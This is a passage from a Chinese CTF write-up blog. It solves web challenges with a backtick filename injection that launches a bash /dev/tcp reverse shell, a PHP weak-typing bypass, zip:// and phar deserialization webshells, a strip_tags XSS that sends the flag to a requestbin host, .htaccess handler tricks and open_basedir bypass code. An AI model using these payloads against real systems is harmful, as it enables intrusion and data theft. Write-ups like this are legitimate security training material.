<span class="keyword">not</span> file_metas:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("please upload a image!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> meta <span class="keyword">in</span> file_metas:</span><br><span class="line">filename = unquote(meta[<span class="string">'filename'</span>])</span><br><span class="line"><span class="keyword">if</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.jpg'</span> <span class="keyword">and</span> os.path.splitext(filename)[<span class="number">1</span>] != <span class="string">'.png'</span>:</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("only upoded jpg or png !")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">tmp = filename</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">tmp = unquote(tmp)</span><br><span class="line"><span class="keyword">if</span> re.search(<span class="string">r'\||\;|\&amp;|\&gt;|\&lt;|\t|\n|\r|\.\.|rm|curl|wget|cat|mv|touch|db'</span>,tmp,re.IGNORECASE):</span><br><span class="line">self.write(<span class="string">'&lt;script&gt;alert("Hacking!!!")&lt;/script&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">user = self.orm.query(User).filter(User.username == self.current_user).one()</span><br><span class="line">user.avatar = filename</span><br><span class="line">self.orm.commit()</span><br><span class="line">file_path = os.path.join(upload_path, filename)</span><br><span class="line"><span class="keyword">with</span> open(file_path, <span class="string">'wb'</span>) <span class="keyword">as</span> up:</span><br><span class="line">up.write(meta[<span class="string">'body'</span>])</span><br><span class="line">self.write(json.dumps(ret))</span><br><span class="line">self.redirect(<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure><p>这里屏蔽了一些字符和关键字，可以考虑用反引号以及上传 bash 文件并且用bash调用那个文件反弹 shell 试试，写入一个图片文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在上传的时候抓包修改一下问件名为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#96;bash sshop&#x2F;views&#x2F;upload&#x2F;a.png&#96;.png</span><br></pre></td></tr></table></figure><p>上传之后刷新个人页面，可以看到触发了反弹，下面就是找flag文件并且拿到flag</p><img src="/2020/08/15/DASfinaltest/10.png" class=""><h2 id="彩票中心"><a href="#彩票中心" class="headerlink" title="彩票中心"></a>彩票中心</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php弱类型比较绕过</li><li>json数据</li><li>文件包含</li><li>zip伪协议</li><li>linux find命令</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>根据提示直接抓取买彩票的包，看一下数据格式，是json的，这个跟之前遇到过的题很像，7个数字对上的就奖励钱，修改一下发送的数据，这里用到弱类型，测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">'1234567'</span>;</span><br><span class="line">$target=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">true</span>,<span class="number">2</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">var_dump($target[<span class="number">1</span>]==$number[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/11.png" class=""><p>可以看到结果，其实就是无论数字还是字母和true作比较返回的永远是true，就可以利用这一点一直刷取金钱，在这之后会发现钱不够买flag，只能买hint，这里前端js没有响应，猜测这里和前面买彩票一样的方法，把action的值改为hint应该就可以了</p><img src="/2020/08/15/DASfinaltest/12.png" class=""><p>当然也可以找到购买hint的js代码，在前端直接运行拿到admin的密码</p><p>注册登录，会发现权限变为了超级管理员，还多了个黑产账户信息处理页面</p><img src="/2020/08/15/DASfinaltest/14.png" class=""><p>在黑产账户信息处理页面可以上传docx文件，这本身就是一个压缩包文件，猜测可以上传一句话木马，由于上传的是压缩包文件，那么应该可以利用zip://伪协议进行包含shell</p><img src="/2020/08/15/DASfinaltest/13.png" class=""><p>将文件上传，伪协议包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/15.png" class=""><p>下面就是要找到flag了，用find命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/16.png" class=""><p>找到之后拿到flag</p><img src="/2020/08/15/DASfinaltest/17.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;EZSQL&quot;&gt;&lt;a href=&quot;#EZSQL&quot; class=&quot;headerlink&quot; title=&quot;EZSQL&quot;&gt;&lt;/a&gt;EZSQL
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>remaining</title>
    <link href="http://yoursite.com/2020/08/06/remaining/"/>
    <id>http://yoursite.com/2020/08/06/remaining/</id>
    <published>2020-08-06T04:48:04.000Z</published>
    <updated>2020-08-10T04:34:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog<a id="more"></a></h2><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>CSP限制</li><li>strip_tags漏洞利用</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>源码里的worker.js中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">'#like'</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到flag在UA字段中，admin会自动点击like标签</p><p>在util.php中，对能用的标签做了限制，只能用<code>&lt;audio&gt;</code>,查找strip_tags，当strip_tags与白名单标签一起使用时，php允许在白名单标签名称内出现斜杠（“ /”），并将其复制到结果中。(<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在<code>&lt;a/udio&gt;</code>可以使用a标签</p><p>又存在CSP，不能跨域请求，可以用a标签进行请求</p><img src="/2020/08/06/remaining/1.png" class=""><p>可以看到content是可控的，且用到了render_tags方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br><span class="line">浏览器解析后就成了</span><br><span class="line">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br></pre></td></tr></table></figure><p>这样flag就会被带出了</p><img src="/2020/08/06/remaining/2.png" class=""><h2 id="D3CTF-2019-EzUpload-环境问题未打通，一个早上没整出来"><a href="#D3CTF-2019-EzUpload-环境问题未打通，一个早上没整出来" class="headerlink" title="[D3CTF 2019]EzUpload(环境问题未打通，一个早上没整出来)"></a>[D3CTF 2019]EzUpload(环境问题未打通，一个早上没整出来)</h2><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>phar协议</li><li>序列化</li><li>.htaccess新形式</li><li>代码审计</li></ul><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过check后文件写入。文件内容从传入的url读取，一般情况下是允许读取远程文件的，因此可以在vps上设置文件。</p><p><code>checkdir()</code>检查了<code>$this-&gt;userdir</code>，先放着</p><p><code>checkurl()</code>禁止了url出现<code>php|file</code>，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用<code>data://</code>协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkext()&#96;禁止了&#96;filename&#96;出现&#96;..&#96;、&#96;&#x2F;&#96;、&#96;ph&#96;，可以想到&#96;.htaccess</span><br></pre></td></tr></table></figure><p>一般的.htaccess格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line"> SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br></pre></td></tr></table></figure><p>这里还有另一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>写入的.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>这里要获取<code>upload/</code>目录的绝对路径，可以通过<code>__destruct()</code>中的 <code>echo $string;</code> 触发<code>__toString()</code>，打印<code>__DIR__</code>，phar可以进行gzip压缩，从而绕过对一些字符的检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($d));</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"somnus2.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行gzip压缩，再放到内网靶机的web服务下</p><p>先上传</p><img src="/2020/08/06/remaining/3.png" class=""><p>再用phar触发反序列化</p><img src="/2020/08/06/remaining/4.png" class=""><p>同样的，接下来再绝对路径中写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/var/www/html/45f6a4a57549a572/upload/adeee0c170ad4ffb110df0cde294aecd/shell'</span>;<span class="comment">//这里不需要加后缀</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'aaaaaaaaaaa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前后瞎凑的字符串为了绕过过滤</p><img src="/2020/08/06/remaining/5.png" class=""><p>到这里能访问就能看到phpinfo页面了，但是环境问题没成功，那个上传后的目录不能访问</p><p>最后还有一步就是绕过<code>open_basedir和disable_function</code></p><p>直接用蚁剑的插件就能绕过拿到flag了，这里就没图能贴了，或者是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);var_dump(show_source(<span class="string">'/F1aG_1s_H4r4'</span>));</span><br></pre></td></tr></table></figure><p>也可以拿到flag，那这题就到这了，学到东西才是真，flag不重要(233333)</p><h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>无列名注入</li><li>phar反序列化</li><li>代码审计</li><li>获取token</li></ul><h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>题目给了源码，直接下载</p><p>开题，phpshe一个商户框架，查一下CVE(<a href="https://anquan.baidu.com/article/697" target="_blank" 